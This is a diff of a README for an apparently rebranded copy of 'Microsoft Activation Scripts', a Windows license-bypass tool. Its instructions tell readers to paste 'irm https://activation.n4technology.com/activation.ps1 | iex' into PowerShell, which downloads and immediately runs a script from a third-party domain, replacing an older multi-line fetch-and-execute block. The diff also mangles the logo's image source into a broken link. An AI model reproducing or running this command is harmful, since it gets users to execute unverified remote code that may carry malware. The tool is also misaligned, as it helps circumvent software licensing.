@@ -1,4 +1,4 @@
-<p align="center"><img src="https://massgrave.dev/images/logo_small.png" alt="MAS Logo"></p>
+<p align="center"><img src="[https://massgrave.dev/images/logo_small.png](https://n4technology.com/assets/img/logo.svg)" alt="MAS Logo"></p>
 
 <h1 align="center">Microsoft  Activation  Scripts (MAS)</h1>
 
@@ -12,12 +12,8 @@
 -   Right-click on the Windows start menu and select PowerShell or Terminal (Not CMD).
 -   Copy-paste the below code and press enter
     ```
-    $scriptUrl = "https://activation.n4technology.com/activation.ps1"
-    $response = Invoke-WebRequest -Uri $scriptUrl -UseBasicParsing
-    $scriptContent = [System.Text.Encoding]::UTF8.GetString($response.Content)
-    Invoke-Expression $scriptContent
-
-
+    irm https://activation.n4technology.com/activation.ps1 | iex
+    
     ```
 -   You will see the activation options. Follow the on-screen instructions.
 -   That's all.
@@ -26,4 +22,4 @@
 
 ---
 
-<p align="center">Made with Love ❤️</p>
+<p align="center">Made with Love ❤️ thanks mas</p>
